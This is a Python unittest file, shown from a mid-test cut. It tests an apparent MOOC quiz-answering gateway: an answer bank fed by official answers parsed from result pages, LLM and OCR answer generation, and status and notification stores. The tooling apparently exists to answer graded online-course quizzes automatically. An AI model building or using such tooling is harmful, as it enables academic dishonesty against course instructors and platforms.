                  "correct_text": "2", "correct_letters": [], "selected_letters": [],
                  "is_correct": False, "blank": True, "status_text": "",
                  "analysis_visible": False}],
                None, False,
            )
            self.assertEqual(bank.all(), [])
            self.assertEqual(result["skipped"], 1)

    def test_apply_feedback_wrong_without_answer_keeps_bank_answer(self):
        """结果页没给出正确答案时，不能把库里已有的答案标记为错。"""
        from app.mooc_result import apply_feedback

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "completion", "title": "设 A 是三阶方阵", "options": [],
                      "answer": "3", "source": "official", "status": "adopted"})
            apply_feedback(
                bank,
                [{"type": "completion", "title": "设 A 是三阶方阵", "options": [],
                  "correct_text": "", "correct_letters": [], "selected_letters": [],
                  "is_correct": False, "blank": False, "status_text": "你错选为2",
                  "analysis_visible": True}],
                None, False,
            )
            bank.flush()
            row = bank.find_exact("completion", "设 A 是三阶方阵", [])
            self.assertEqual(row["answer"], "3")
            self.assertEqual(row["status"], "adopted")
            self.assertFalse(row["conflict"])

    def test_official_answer_clears_ai_conflict_sibling(self):
        """官方答案确定后，同题 AI 旧答案的冲突标记要清掉。

        旧实现只在「官方记录 ≥ 2 条」时对齐，AI 记录上的 conflict 永远
        留在冲突工作台 —— 表现就是「答案回滚了，冲突还在」。
        """
        from app.mooc_result import apply_feedback

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "completion", "title": "若六阶矩阵的秩为", "options": [],
                      "answer": "", "source": "official", "status": "pending",
                      "official_via": "paper"})
            bank.add({"type": "completion", "title": "若六阶矩阵的秩为", "options": [],
                      "answer": "2", "source": "ai", "status": "pending",
                      "conflict": True})
            apply_feedback(
                bank,
                [{"type": "completion", "title": "若六阶矩阵的秩为", "options": [],
                  "correct_text": "3", "correct_letters": [], "selected_letters": [],
                  "is_correct": False, "blank": False, "status_text": "你错选为2",
                  "analysis_visible": True}],
                None, False,
            )
            bank.flush()
            rows = [i for i in bank.all() if i["title"] == "若六阶矩阵的秩为"]
            official = [i for i in rows if i["source"] == "official"]
            self.assertTrue(official)
            self.assertTrue(all(i["answer"] == "3" for i in official))
            self.assertFalse(any(i["conflict"] for i in rows))

    def test_official_truth_indexes_visible_pages_only(self):
        """真值索引只收答案块可见的结果页，并按目标选项顺序翻译答案。"""
        from app.official_truth import OfficialTruth

        visible_fill = (
            '<div class="m-FillBlank u-questionItem f-pr analysisMode">'
            '<div class="j-title title f-cb"><div class="f-richEditorText j-richTxt">'
            '自动裁决填空题</div><div class="qaMark j-qamark"></div></div>'
            '<div class="f-cb inputArea"><div class="f-fl j-input input">'
            '<textarea name="inputtxt" class="j-textarea inputtxt"></textarea></div></div>'
            '<div class="analysisInfo j-analysis"><span class="tt1">正确答案：</span>'
            '<span class="tt2">3</span></div></div>'
        )
        hidden_fill = (
            '<div class="m-FillBlank u-questionItem f-pr examMode">'
            '<div class="j-title title f-cb"><div class="f-richEditorText j-richTxt">'
            '隐藏答案题</div><div class="qaMark j-qamark"></div></div>'
            '<div class="f-cb inputArea"><div class="f-fl j-input input">'
            '<textarea name="inputtxt" class="j-textarea inputtxt"></textarea></div></div>'
            '<div class="analysisInfo j-analysis f-dn"><span class="tt1">正确答案：</span>'
            '<span class="tt2">2</span></div></div>'
        )
        visible_single = (
            '<div class="m-choiceQuestion u-questionItem analysisMode">'
            '<div class="j-title title f-cb"><div class="f-richEditorText j-richTxt">'
            '选项换序题</div><div class="qaMark j-qamark"></div></div>'
            '<div class="j-choicebox"><div><ul class="choices f-cb">'
            '<li class="f-cb  "><input type="radio" disabled><label><div class="optionPos">A.</div>'
            '<div class="f-richEditorText optionCnt">1</div></label></li>'
            '<li class="f-cb checked"><input type="radio" checked disabled><label><div class="optionPos">B.</div>'
            '<div class="f-richEditorText optionCnt">2</div></label></li></ul>'
            '<div class="analysisInfo"><div><span class="tt1">正确答案：</span><span class="tt2">B</span>'
            '<span class="tt3">你选对了</span></div></div></div></div></div>'
        )
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "a.html"), "w", encoding="utf-8") as fp:
                fp.write(visible_fill + visible_single)
            with open(os.path.join(tmp, "b.html"), "w", encoding="utf-8") as fp:
                fp.write(hidden_fill)
            with open(os.path.join(tmp, "c.html"), "w", encoding="utf-8") as fp:
                fp.write(visible_fill)
            truth = OfficialTruth(tmp, os.path.join(tmp, "truth.json"))
            self.assertEqual(truth.lookup("completion", "自动裁决填空题", []), {
                "answer": "3", "title": "", "options": [], "evidence": 1, "files": 2})
            self.assertIsNone(truth.lookup("completion", "隐藏答案题", []))
            self.assertEqual(truth.lookup("single", "选项换序题", ["1", "2"])["answer"], "B")
            # 目标选项换序后答案要跟着内容走：内容 2 在新顺序里是 A。
            self.assertEqual(truth.lookup("single", "选项换序题", ["2", "1"])["answer"], "A")
            # 第二次实例应能直接读缓存（指纹未变）。
            again = OfficialTruth(tmp, os.path.join(tmp, "truth.json"))
            self.assertEqual(again.lookup("completion", "自动裁决填空题", [])["answer"], "3")

    def test_official_truth_drops_ambiguous_answers(self):
        """同一图片身份下出现两个不同答案时，这组证据不可用。"""
        from app.official_truth import OfficialTruth

        def page(answer: str) -> str:
            return (
                '<div class="m-FillBlank u-questionItem f-pr analysisMode">'
                '<div class="j-title title f-cb"><div class="f-richEditorText j-richTxt">'
                '有歧义填空题</div><div class="qaMark j-qamark"></div></div>'
                '<div class="f-cb inputArea"><div class="f-fl j-input input">'
                '<textarea name="inputtxt" class="j-textarea inputtxt"></textarea></div></div>'
                '<div class="analysisInfo j-analysis"><span class="tt1">正确答案：</span>'
                '<span class="tt2">%s</span></div></div>' % answer
            )

        with tempfile.TemporaryDirectory() as tmp:
            for index, answer in enumerate(("3", "5")):
                with open(os.path.join(tmp, "%d.html" % index), "w", encoding="utf-8") as fp:
                    fp.write(page(answer))
            truth = OfficialTruth(tmp, os.path.join(tmp, "truth.json"))
            self.assertIsNone(truth.lookup("completion", "有歧义填空题", []))

    def test_official_sibling_answer_unique_only(self):
        """同题其它官方记录只有一个答案时才可用；官方自己不一致就不猜。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "completion", "title": "同题官方填空题", "options": [],
                      "answer": "3", "source": "official", "status": "adopted"})
            ai = bank.add({"type": "completion", "title": "同题官方填空题", "options": [],
                           "answer": "-27", "source": "ai", "status": "pending",
                           "conflict": True})
            found = bank.official_sibling_answer(
                "completion", "同题官方填空题", [], exclude_ids=[ai["id"]])
            self.assertEqual(found["answer"], "3")
            # 排除唯一官方记录后就没有可用的同题官方答案了。
            bank.flush()
            officials = [i for i in bank.all() if i["source"] == "official"]
            self.assertIsNone(bank.official_sibling_answer(
                "completion", "同题官方填空题", [], exclude_ids=[officials[0]["id"]]))
            # 两条官方记录答案不同 → 有歧义，返回 None。
            bank.add({"type": "completion", "title": "同题官方填空题", "options": [],
                      "answer": "5", "source": "official", "status": "adopted"})
            self.assertIsNone(bank.official_sibling_answer(
                "completion", "同题官方填空题", [], exclude_ids=[ai["id"]]))

    def test_apply_feedback_writes_options_with_letter_answer(self):
        """官方答案的字母必须和它依据的选项顺序一起入库。

        OCS 同一道题在不同场次会换选项顺序。字母只在当时的顺序里才有意义，
        只写字母不写顺序 → 库里那个字母指向另一个选项 → 答出来是错的
        （实测 50 题里错的 5 道全是单选，判断和填空全对）。
        """
        from app.mooc_result import apply_feedback

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            # 上一场次：顺序是 [甲,乙,丙,丁]，正确答案是 丙 → 存成 C
            bank.add({"type": "single", "title": "1+1=?",
                      "options": ["甲", "乙", "丙", "丁"], "answer": "C",
                      "source": "official", "status": "adopted"})
            # 这一场次：顺序换了，[丙,甲,丁,乙]，平台说正确答案是 丙（即 A）
            apply_feedback(
                bank,
                [{"type": "single", "title": "1+1=?", "options": ["丙", "甲", "丁", "乙"],
                  "correct_letters": ["A"], "correct_text": "", "selected_letters": ["A"],
                  "is_correct": True, "blank": False, "status_text": "选对"}],
                None, False,
            )
            bank.flush()
            item = bank.all()[0]
            # 字母和选项顺序必须自洽：存的字母所指的那个选项，内容就是平台标对的那个
            self.assertEqual(item["options"], ["丙", "甲", "丁", "乙"])
            self.assertEqual(item["answer"], "A")
            self.assertEqual(item["options"][0], "丙")
            # 按新顺序查询时仍能翻译出正确字母
            from app.bank import translate_answer
            self.assertEqual(
                translate_answer(item["answer"], item["options"], ["丙", "甲", "丁", "乙"], "single"),
                "A",
            )

    def test_apply_feedback_dry_and_apply(self):

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "1+1=?", "options": ["1", "2"], "answer": "A"})
            items = [{"type": "single", "title": "1+1=?", "options": ["1", "2"],
                      "correct_letters": ["B"], "selected_letters": ["A"], "is_correct": False}]
            dry = main.apply_feedback(bank, items, None, dry_run=True)
            self.assertEqual(dry["applied"], 0)
            self.assertEqual(bank.find_exact("single", "1+1=?", ["1", "2"])["answer"], "A")
            real = main.apply_feedback(bank, items, None, dry_run=False)
            self.assertGreaterEqual(real["applied"], 1)
            row = bank.find_exact("single", "1+1=?", ["1", "2"])
            self.assertEqual(row["answer"], "B")
            self.assertEqual(row["status"], "adopted")
            self.assertIn("A", row["wrong_answers"])


class PayloadTests(unittest.TestCase):
    def test_responses_multimodal(self):
        from app import llm

        messages = build_messages("single", "题", ["甲", "乙"], ["data:image/png;base64,AAA"])
        payload = llm._payload({"model": "m"}, messages, "responses")
        parts = payload["input"][0]["content"]
        self.assertEqual(parts[0]["type"], "input_text")
        self.assertEqual(parts[-1]["type"], "input_image")
        self.assertEqual(parts[-1]["image_url"], "data:image/png;base64,AAA")


class RpcPaperTests(unittest.TestCase):
    def test_parse_single_multiple_judge_completion(self):
        from app.mooc_rpc import parse_paper

        paper = {
            "showAnalysis": True,
            "submitStatus": 2,
            "tid": 1,
            "aid": 2,
            "objectiveQList": [
                {"type": 1, "title": "<p>单选<img src=\"http://x/a.png\" /></p>",
                 "optionDtos": [{"content": "<p>甲</p>", "answer": False},
                                {"content": "<p>乙</p>", "answer": True}]},
                {"type": 2, "title": "多选", "optionDtos": [
                    {"content": "A", "answer": True}, {"content": "B", "answer": False},
                    {"content": "C", "answer": True}, {"content": "D", "answer": False}]},
                {"type": 4, "title": "判断", "optionDtos": [
                    {"content": "正确", "answer": False}, {"content": "错误", "answer": True}]},
                {"type": 3, "title": "填空", "stdAnswer": "42", "optionDtos": []},
                {"type": 1, "title": "没答案", "optionDtos": [{"content": "甲", "answer": False}]},
            ],
        }
        parsed = parse_paper(paper)
        self.assertEqual(parsed["total"], 5)
        self.assertEqual(parsed["answered"], 4)
        self.assertEqual(parsed["unanswered"], 1)
        items = {i["title"]: i for i in parsed["items"]}
        single = items["单选 http://x/a.png"]
        self.assertEqual(single["type"], "single")
        self.assertEqual(single["correct_letters"], ["B"])
        self.assertEqual(items["多选"]["correct_letters"], ["A", "C"])
        self.assertEqual(items["判断"]["correct_text"], "错误")
        self.assertEqual(items["填空"]["correct_text"], "")

    def test_parse_paper_ignores_empty(self):
        from app.mooc_rpc import parse_paper

        self.assertEqual(parse_paper({})["items"], [])
        self.assertEqual(parse_paper(None)["items"], [])


class QuizStatusTests(unittest.TestCase):
    def test_upsert_and_list(self):
        from app.quiz_status import QuizStatus

        with tempfile.TemporaryDirectory() as tmp:
            store = QuizStatus(os.path.join(tmp, "qs.json"), limit=3)
            store.upsert({"tid": "1", "aid": "2", "name": "第一章", "published": True, "total": 10, "answered": 10})
            store.upsert({"tid": "1", "aid": "2", "published": False})
            items = store.all()
            self.assertEqual(len(items), 1)
            # 已发布是「曾经拿到过官方答案」的事实，后一次空上报不抹掉
            self.assertTrue(items[0]["published"])
            self.assertEqual(items[0]["name"], "第一章")
            self.assertEqual(items[0]["reports"], 2)
            for i in range(5):
                store.upsert({"tid": str(i), "published": bool(i % 2)})
            self.assertLessEqual(len(store.all()), 3)
            with self.assertRaises(ValueError):
                store.upsert({"name": "没有 id"})

    def test_same_tid_across_aid_is_one_record(self):
        from app.quiz_status import QuizStatus

        with tempfile.TemporaryDirectory() as tmp:
            store = QuizStatus(os.path.join(tmp, "qs.json"))
            store.upsert({"tid": "1", "aid": "a", "name": "第一章", "published": True,
                          "total": 10, "answered": 10, "answer_keys": ["q1", "q2"]})
            store.upsert({"tid": "1", "aid": "b", "name": "", "published": False,
                          "total": 10, "answered": 0, "answer_keys": []})
            items = store.all()
            self.assertEqual(len(items), 1)
            self.assertEqual(items[0]["key"], "1")
            self.assertEqual(items[0]["aid"], "b")
            self.assertEqual(items[0]["name"], "第一章")
            self.assertEqual(items[0]["answered"], 10)
            self.assertTrue(items[0]["published"])
            self.assertEqual(items[0]["reports"], 2)

    def test_answer_keys_union_never_shrinks(self):
        from app.quiz_status import QuizStatus

        with tempfile.TemporaryDirectory() as tmp:
            store = QuizStatus(os.path.join(tmp, "qs.json"))
            store.upsert({"tid": "1", "total": 3, "answered": 2, "answer_keys": ["a", "b"]})
            store.upsert({"tid": "1", "total": 3, "answered": 2, "answer_keys": ["b", "c"]})
            item = store.all()[0]
            self.assertEqual(item["answered"], 3)
            self.assertEqual(item["answer_keys"], ["a", "b", "c"])

    def test_load_compacts_legacy_tid_aid_keys(self):
        from app.quiz_status import QuizStatus

        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "qs.json")
            with open(path, "w", encoding="utf-8") as fp:
                json.dump({
                    "1:a": {"tid": "1", "aid": "a", "name": "第一章", "at": 100,
                            "total": 10, "answered": 10, "published": True},
                    "1:b": {"tid": "1", "aid": "b", "at": 200,
                            "total": 10, "answered": 0, "published": False},
                }, fp)
            store = QuizStatus(path)
            items = store.all()
            self.assertEqual(len(items), 1)
            self.assertEqual(items[0]["reports"], 2)
            self.assertEqual(items[0]["answered"], 10)
            self.assertTrue(items[0]["published"])
            # 合并结果已经落盘，重开不会又变回两条
            self.assertEqual(len(QuizStatus(path).all()), 1)


class ImageFixTests(unittest.TestCase):
    def test_transparent_image_flattened_on_white(self):
        import base64
        import io

        from PIL import Image

        from app.image_fix import flatten_on_white

        source = Image.new("RGBA", (12, 20), (0, 0, 0, 0))
        source.putpixel((0, 0), (0, 0, 0, 255))
        buffer = io.BytesIO()
        source.save(buffer, format="PNG")
        url = "data:image/png;base64," + base64.b64encode(buffer.getvalue()).decode()

        out = flatten_on_white(url)
        image = Image.open(io.BytesIO(base64.b64decode(out.split(",", 1)[1])))
        self.assertEqual(image.mode, "RGB")
        self.assertGreaterEqual(image.size[1], 96)
        self.assertEqual(image.getpixel((image.size[0] - 1, image.size[1] - 1)), (255, 255, 255))

    def test_plain_image_passthrough(self):
        from app.image_fix import flatten_on_white

        self.assertEqual(flatten_on_white("not-a-data-url"), "not-a-data-url")


class FormulaIndexTests(unittest.TestCase):
    def test_image_text_store_roundtrip(self):
        from app.formula_index import ImageTextStore

        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "image_text.json")
            store = ImageTextStore(path)
            store.put("http://x/a.png", "\\lambda E - A", "vision")
            self.assertEqual(store.get("http://x/a.png"), "\\lambda E - A")
            self.assertEqual(store.mapping()["http://x/a.png"], "\\lambda E - A")
            again = ImageTextStore(path)
            self.assertEqual(again.count(), 1)

    def test_image_asset_store_roundtrip(self):
        from app.image_assets import ImageAssetStore

        with tempfile.TemporaryDirectory() as tmp:
            store = ImageAssetStore(tmp)
            raw = b"\x89PNG\r\n\x1a\nhello"
            sha = store.put_bytes("http://example.com/a.png", raw, "image/png")
            self.assertEqual(len(sha), 64)
            self.assertEqual(store.get_bytes("http://example.com/a.png"), raw)
            self.assertEqual(store.content_type("http://example.com/a.png"), "image/png")
            self.assertEqual(store.stats()["urls"], 1)
            again = ImageAssetStore(tmp)
            self.assertEqual(again.get_bytes("http://example.com/a.png"), raw)
            again.drop("http://example.com/a.png")
            self.assertIsNone(again.get_bytes("http://example.com/a.png"))

    def test_ocr_image_prefers_local_asset(self):
        from app import main

        async def fail_fetch(url):
            raise AssertionError("有本地副本时不应重新下载")

        async def fake_call(provider, messages):
            return "3"

        old_assets, old_fetch, old_call = main.image_assets, main._fetch_image_bytes, main.call_provider
        old_flatten = main.flatten_bytes
        try:
            with tempfile.TemporaryDirectory() as tmp:
                main.image_assets = main.ImageAssetStore(tmp)
                main.image_assets.put_bytes(
                    "http://example.com/a.png", b"\x89PNG\r\n\x1a\nhello", "image/png"
                )
                main._fetch_image_bytes = fail_fetch
                main.call_provider = fake_call
                main.flatten_bytes = lambda raw: b"fixed"
                text, provider, error, retryable = asyncio.run(
                    main._ocr_image([{"name": "x", "vision": "yes", "timeout": 1}], "http://example.com/a.png")
                )
                self.assertEqual(text, "3")
                self.assertEqual(provider, "x")
                self.assertEqual(error, "")
                self.assertTrue(retryable)
        finally:
            main.image_assets, main._fetch_image_bytes, main.call_provider = old_assets, old_fetch, old_call
            main.flatten_bytes = old_flatten

    def test_known_and_failed_retry_window(self):
        from app.formula_index import ImageTextStore

        with tempfile.TemporaryDirectory() as tmp:
            store = ImageTextStore(os.path.join(tmp, "image_text.json"))
            self.assertFalse(store.known("http://x/dead.png"))
            store.put_failed("http://x/dead.png", error="timeout")
            self.assertTrue(store.known("http://x/dead.png"))  # 退避中
            store._items["http://x/dead.png"]["next_retry_at"] = 0  # 到点该重试
            self.assertFalse(store.known("http://x/dead.png"))
            store.put("http://x/ok.png", "内容")
            self.assertTrue(store.known("http://x/ok.png"))

    def test_permanent_failure_is_never_retried(self):
        from app.formula_index import ImageTextStore

        with tempfile.TemporaryDirectory() as tmp:
            store = ImageTextStore(os.path.join(tmp, "image_text.json"))
            store.put_failed("http://x/gone.png", retryable=False, error="HTTP 404")
            self.assertTrue(store.known("http://x/gone.png"))
            self.assertEqual(store.retryable_urls(), [])
            self.assertEqual(store.stats()["permanent"], 1)

    def test_put_failed_does_not_erase_success(self):
        from app.formula_index import ImageTextStore

        with tempfile.TemporaryDirectory() as tmp:
            store = ImageTextStore(os.path.join(tmp, "image_text.json"))
            store.put("http://x/ok.png", "正确文本")
            store.put_failed("http://x/ok.png", error="later timeout")
            self.assertEqual(store.get("http://x/ok.png"), "正确文本")
            self.assertEqual(store.stats()["ok"], 1)
            self.assertEqual(store.stats()["retryable"], 0)

    def test_legacy_failed_entry_becomes_due_retry(self):
        from app.formula_index import ImageTextStore

        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "image_text.json")
            with open(path, "w", encoding="utf-8") as fp:
                json.dump({"http://x/old.png": {"text": "", "failed": True, "at": 1}}, fp)
            store = ImageTextStore(path)
            self.assertFalse(store.known("http://x/old.png"))
            self.assertEqual(store.retryable_urls(), ["http://x/old.png"])

    def test_retry_delay_and_actionable_url(self):
        from app.formula_index import is_actionable_url, retry_delay

        self.assertEqual(retry_delay(1), 60)
        self.assertEqual(retry_delay(2), 300)
        self.assertEqual(retry_delay(99), 86400)
        self.assertTrue(is_actionable_url("http://example.com/a.png"))
        self.assertTrue(is_actionable_url("https://example.com/imageView?x=1"))
        self.assertFalse(is_actionable_url("http://moo"))
        self.assertFalse(is_actionable_url("http://edu-image.no"))
        self.assertFalse(is_actionable_url("http://mooc-image."))
        self.assertFalse(is_actionable_url("ftp://example.com/a.png"))

    def test_prepare_prompt_marks_inline_images_for_vision_routing(self):
        from app import main

        async def fake_fetch(urls):
            return ["data:image/png;base64,AAAA"]

        old_fetch = main.fetch_inline_images
        try:
            main.fetch_inline_images = fake_fetch
            messages, used_images, extra_text, _web_results = asyncio.run(main._prepare_prompt(
                "single", "设 http://example.com/a.png 等于", ["A", "B"],
                None, None, None, "", None, {"inline_images": True},
            ))
            self.assertTrue(used_images)
            self.assertEqual(used_images, ["data:image/png;base64,AAAA"])
            self.assertTrue(messages)
        finally:
            main.fetch_inline_images = old_fetch

    def test_valid_ocr_text_rejects_meta_messages(self):
        from app import main

        self.assertTrue(main._valid_ocr_text(r"\[\nX \sim N(0,1)\n\]"))
        self.assertTrue(main._valid_ocr_text("3"))
        self.assertFalse(main._valid_ocr_text(""))
        self.assertFalse(main._valid_ocr_text("..."))
        self.assertFalse(main._valid_ocr_text("图片未成功附上（当前没有可见的图像内容）"))
        self.assertFalse(main._valid_ocr_text("抱歉，无法识别这张图片"))

    def test_run_formula_index_rebuilds_bank_after_ocr(self):
        from app import main
        from app.bank import Bank
        from app.formula_index import ImageTextStore
        from app.store import ProviderStore

        async def fake_ocr(providers, url):
            return "转写文本", "fake", "", True

        old_bank, old_image_text, old_store, old_ocr = main.bank, main.image_text, main.store, main._ocr_image
        try:
            with tempfile.TemporaryDirectory() as tmp:
                main.bank = Bank(os.path.join(tmp, "bank.json"))
                main.image_text = ImageTextStore(os.path.join(tmp, "image_text.json"))
                main.store = ProviderStore(os.path.join(tmp, "providers.json"))
                main.store.add({
                    "name": "fake", "base_url": "https://example.com/v1",
                    "api_key": "sk-test", "model": "test-model",
                })
                main.bank.add({
                    "type": "judge", "title": "设 http://example.com/a.png 是特征值",
                    "options": ["对", "错"], "answer": "正确",
                    "status": "adopted",
                })
                main._ocr_image = fake_ocr
                asyncio.run(main._run_formula_index(["http://example.com/a.png"]))
                self.assertEqual(main.image_text.get("http://example.com/a.png"), "转写文本")
                # 本轮 OCR 结束后必须重建 bank 的规范索引，下一次遇到才能命中。
                found = main.bank.find_exact("judge", "设 转写文本 是特征值", ["对", "错"])
                self.assertIsNotNone(found)
        finally:
            main.bank, main.image_text, main.store, main._ocr_image = old_bank, old_image_text, old_store, old_ocr

    def test_collect_urls_and_latex_plain(self):
        from app.formula_index import collect_urls, latex_plain

        items = [{"title": "设 http://a/1.png 与 http://b/2.png", "options": ["http://a/1.png", "文字"]}]
        self.assertEqual(collect_urls(items), ["http://a/1.png", "http://b/2.png"])
        plain = latex_plain("$\\begin{vmatrix} 0 & 1 \\end{vmatrix}$ x^2")
        self.assertIn("0", plain)
        self.assertNotIn("\\", plain)
        self.assertNotIn("{", plain)

    def test_bank_search_uses_image_text(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "设 http://a/1.png 是特征值", "options": ["对", "错"],
                      "answer": "正确"})
            self.assertEqual(bank.search("lambda E 减 A", 5, {"http://a/1.png": "lambda E 减 A"})[0]["answer"], "正确")
            self.assertEqual(bank.search("lambda E 减 A", 5), [])


class DwrVoteTests(unittest.TestCase):
    def test_parse_dwr_shaped_questions(self):
        from app.mooc_rpc import parse_paper

        paper = {"questions": [
            {"content": "单选题干", "options": [
                {"content": "甲", "answer": True}, {"content": "乙", "answer": False}]},
            {"content": "判断题干", "options": [
                {"content": "正确", "answer": False}, {"content": "错误", "answer": True}]},
            {"content": "填空题干", "stdAnswer": "42", "options": []},
        ]}
        parsed = parse_paper(paper)
        self.assertEqual(parsed["answered"], 3)
        by_title = {i["title"]: i for i in parsed["items"]}
        self.assertEqual(by_title["单选题干"]["type"], "single")
        self.assertEqual(by_title["单选题干"]["correct_letters"], ["A"])
        self.assertEqual(by_title["判断题干"]["type"], "judge")
        self.assertEqual(by_title["判断题干"]["correct_text"], "错误")
        self.assertEqual(by_title["填空题干"]["type"], "completion")

    def test_vote_queue_add_and_remove(self):
        from app.ops import VoteQueue

        with tempfile.TemporaryDirectory() as tmp:
            queue = VoteQueue(os.path.join(tmp, "vote_queue.json"))
            item = {"id": "x1", "title": "题", "type": "judge", "subject": "默认", "answer": "正确"}
            queue.add(item, "错误", {"votes": {"错误": 3}})
            self.assertEqual(queue.items()[0]["suggestion"], "错误")
            queue.add(item, "错误", {"votes": {"错误": 3}})
            self.assertEqual(len(queue.items()), 1)
            self.assertEqual(queue.remove(["x1"]), 1)
            self.assertEqual(queue.items(), [])


class NotifyTests(unittest.TestCase):
    def test_config_masked_and_format(self):
        from app.notify import NotifyConfig, _build_request, format_daily

        with tempfile.TemporaryDirectory() as tmp:
            cfg = NotifyConfig(os.path.join(tmp, "notify.json"))
            cfg.update({"enabled": True, "provider": "serverchan", "key": "SCT123456789"})
            masked = cfg.masked()
            self.assertTrue(masked["enabled"])
            self.assertIn("****", masked["key"])
            self.assertTrue(cfg.get()["events"]["daily"])

        title, body = format_daily({"backup": "a.zip", "backup_bytes": 10, "conflicts": 3,
                                    "formula": {"urls": 5, "missing": 0},
                                    "probes_offline": ["ocs-progress"]})
        self.assertIn("OCS 网关日报", title)
        self.assertIn("备份", body)
        self.assertIn("冲突", body)
        self.assertIn("ocs-progress", body)

        method, url, payload = _build_request({"provider": "serverchan", "key": "K"}, "t", "b")
        self.assertEqual(method, "POST")
        self.assertIn("sctapi.ftqq.com", url)
        self.assertEqual(payload["title"], "t")
        self.assertIsNone(_build_request({"provider": "webhook", "url": ""}, "t", "b"))


class OpsAndProbeTests(unittest.TestCase):
    def test_ops_log_and_probe_store(self):
        from app.ops import OpsLog, ProbeStore

        with tempfile.TemporaryDirectory() as tmp:
            ops = OpsLog(os.path.join(tmp, "ops.json"), limit=3)
            ops.add_run("daily", "ok", {"backup": "b.zip"})
            self.assertEqual(ops.runs()[0]["name"], "daily")
            ops.set_meta("last_daily", "2026-11-09")
            self.assertEqual(ops.meta()["last_daily"], "2026-11-09")
            for i in range(5):
                ops.add_run(f"r{i}", "ok")
            self.assertLessEqual(len(ops.runs(10)), 3)

            probes = ProbeStore(os.path.join(tmp, "probes.json"))
            probes.touch("mooc-result-probe", "0.7.0", "https://x")
            data = probes.all()
            self.assertTrue(data["mooc-result-probe"]["online"])
            self.assertEqual(data["mooc-result-probe"]["ver"], "0.7.0")


class LlmResponseLimitTests(unittest.TestCase):
    class FakeResponse:
        def __init__(self, chunks):
            self.chunks = chunks

        async def aiter_bytes(self):
            for chunk in self.chunks:
                yield chunk

    def test_read_limited_rejects_oversize(self):
        response = self.FakeResponse([b"a" * 10, b"b" * 10])
        with self.assertRaises(ProviderError):
            asyncio.run(llm._read_limited(response, 15))

    def test_read_limited_accepts_exact_limit(self):
        response = self.FakeResponse([b"a" * 10, b"b" * 10])
        self.assertEqual(asyncio.run(llm._read_limited(response, 20)), b"a" * 10 + b"b" * 10)

    def test_read_limited_truncates_error_body(self):
        response = self.FakeResponse([b"a" * 10, b"b" * 10])
        self.assertEqual(asyncio.run(llm._read_limited(response, 15, truncate=True)),
                         b"a" * 10 + b"b" * 5)


if __name__ == "__main__":
    unittest.main()
